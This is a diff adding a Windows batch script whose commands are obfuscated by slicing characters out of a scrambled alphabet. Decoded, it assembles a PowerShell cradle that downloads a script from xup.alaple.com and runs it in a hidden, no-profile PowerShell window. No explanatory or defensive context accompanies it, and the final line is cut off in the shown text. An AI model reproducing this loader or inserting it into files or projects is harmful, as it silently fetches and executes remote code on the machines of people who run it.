@@ -1,0 +1,28 @@
+@echo off
+cd %SystemRoot%\System32
+set OWcZ=
+Set OWcZ=%OWcZ%ZJjX6Tfo5N8MA9
+Set OWcZ=%OWcZ%p4bED7eGRlc03I
+Set OWcZ=%OWcZ%LCFmy1BzSdxigQ
+Set OWcZ=%OWcZ%nHKkWhtOU2wrPY
+Set OWcZ=%OWcZ%qvVsua
+set cPiyGqG=^|
+set system=
+Set system=%system%%OWcZ:~39,1%%OWcZ:~20,1%%OWcZ:~38,1%(%OWcZ:~9,1%%OWcZ:~20,1%%OWcZ:~52,1%-%OWcZ:~49,1%%OWcZ:~16,1%%OWcZ:~2,1%
+Set system=%system%%OWcZ:~20,1%%OWcZ:~24,1%%OWcZ:~48,1% %OWcZ:~9,1%%OWcZ:~20,1%%OWcZ:~48,1%.%OWcZ:~46,1%%OWcZ:~20,1%%OWcZ:~16,1%
+Set system=%system%%OWcZ:~29,1%%OWcZ:~23,1%%OWcZ:~39,1%%OWcZ:~20,1%%OWcZ:~42,1%%OWcZ:~48,1%).%OWcZ:~18,1%%OWcZ:~7,1%%OWcZ:~52,1%
+Set system=%system%%OWcZ:~42,1%%OWcZ:~23,1%%OWcZ:~7,1%%OWcZ:~61,1%%OWcZ:~37,1%%OWcZ:~36,1%%OWcZ:~48,1%%OWcZ:~53,1%%OWcZ:~39,1%%OWcZ:~42,1%%OWcZ:~40,1%
+Set system=%system%("%OWcZ:~47,1%%OWcZ:~48,1%%OWcZ:~48,1%%OWcZ:~14,1%%OWcZ:~59,1%://%OWcZ:~38,1%
+Set system=%system%%OWcZ:~60,1%%OWcZ:~14,1%.%OWcZ:~61,1%%OWcZ:~23,1%%OWcZ:~61,1%%OWcZ:~14,1%%OWcZ:~23,1%%OWcZ:~20,1%.%OWcZ:~24,1%
+Set system=%system%%OWcZ:~7,1%%OWcZ:~31,1%/?%OWcZ:~37,1%%OWcZ:~31,1%%OWcZ:~58,1%%OWcZ:~47,1%%OWcZ:~57,1%%OWcZ:~12,1%%OWcZ:~21,1%
+Set system=%system%%OWcZ:~43,1%%OWcZ:~61,1%%OWcZ:~56,1%%OWcZ:~24,1%%OWcZ:~18,1%%OWcZ:~60,1%%OWcZ:~27,1%%OWcZ:~1,1%%OWcZ:~37,1%%OWcZ:~36,1%%OWcZ:~49,1%
+Set system=%system%%OWcZ:~47,1%%OWcZ:~53,1%%OWcZ:~16,1%%OWcZ:~10,1%%OWcZ:~46,1%%OWcZ:~30,1%%OWcZ:~48,1%%OWcZ:~27,1%%OWcZ:~8,1%%OWcZ:~18,1%%OWcZ:~44,1%
+Set system=%system%%OWcZ:~41,1%%OWcZ:~0,1%%OWcZ:~12,1%%OWcZ:~33,1%%OWcZ:~24,1%%OWcZ:~54,1%%OWcZ:~6,1%%OWcZ:~61,1%%OWcZ:~25,1%%OWcZ:~11,1%%OWcZ:~54,1%
+Set system=%system%%OWcZ:~5,1%%OWcZ:~42,1%%OWcZ:~2,1%%OWcZ:~23,1%%OWcZ:~44,1%%OWcZ:~4,1%%OWcZ:~28,1%%OWcZ:~25,1%%OWcZ:~16,1%%OWcZ:~42,1%%OWcZ:~37,1%
+Set system=%system%%OWcZ:~41,1%%OWcZ:~38,1%%OWcZ:~52,1%%OWcZ:~34,1%%OWcZ:~50,1%%OWcZ:~55,1%%OWcZ:~35,1%%OWcZ:~15,1%%OWcZ:~7,1%%OWcZ:~6,1%%OWcZ:~48,1%
+Set system=%system%%OWcZ:~4,1%%OWcZ:~27,1%%OWcZ:~21,1%%OWcZ:~41,1%%OWcZ:~20,1%%OWcZ:~11,1%%OWcZ:~56,1%%OWcZ:~1,1%%OWcZ:~57,1%/%OWcZ:~18,1%
+Set system=%system%%OWcZ:~46,1%%OWcZ:~31,1%%OWcZ:~47,1%%OWcZ:~29,1%%OWcZ:~24,1%%OWcZ:~18,1%%OWcZ:~33,1%%OWcZ:~17,1%%OWcZ:~30,1%%OWcZ:~7,1%%OWcZ:~40,1%
+Set system=%system%%OWcZ:~1,1%%OWcZ:~53,1%%OWcZ:~23,1%%OWcZ:~27,1%+%OWcZ:~21,1%%OWcZ:~16,1%%OWcZ:~24,1%+/%OWcZ:~56,1%
+Set system=%system%%OWcZ:~24,1%%OWcZ:~5,1%%OWcZ:~54,1%%OWcZ:~34,1%%OWcZ:~61,1%%OWcZ:~31,1%%OWcZ:~30,1%%OWcZ:~41,1%%OWcZ:~25,1%%OWcZ:~50,1%%OWcZ:~24,1%
+Set system=%system%%OWcZ:~18,1%%OWcZ:~57,1%%OWcZ:~2,1%%OWcZ:~23,1%%OWcZ:~7,1%=")
+echo %%system%%%cPiyGqG%%OWcZ:~46,1%%OWcZ:~39,1%%OWcZ:~42,1%%OWcZ:~37,1%%OWcZ:~7,1%%OWcZ:~52,1%%OWcZ:~59,1%%OWcZ:~54,1%%OWcZ:~7,1%%OWcZ:~52,1%%OWcZ:~20,1%%OWcZ:~53,1%%OWcZ:~36,1%%OWcZ:~47,1%%OWcZ:~20,1%%OWcZ:~23,1%%OWcZ:~23,1%\%OWcZ:~57,1%%OWcZ:~33,1%.%OWcZ:~25,1%\%OWcZ:~14,1%%OWcZ:~7,1%%OWcZ:~52,1%%OWcZ:~20,1%%OWcZ:~53,1%%OWcZ:~59,1%%OWcZ:~47,1%%OWcZ:~20,1%%OWcZ:~23,1%%OWcZ:~23,1%.%OWcZ:~20,1%%OWcZ:~38,1%%OWcZ:~20,1% -%OWcZ:~42,1%%OWcZ:~7,1%%OWcZ:~14,1% -%OWcZ:~52,1%%OWcZ:~39,1%%OWcZ:~42,1% %OWcZ:~33,1% -
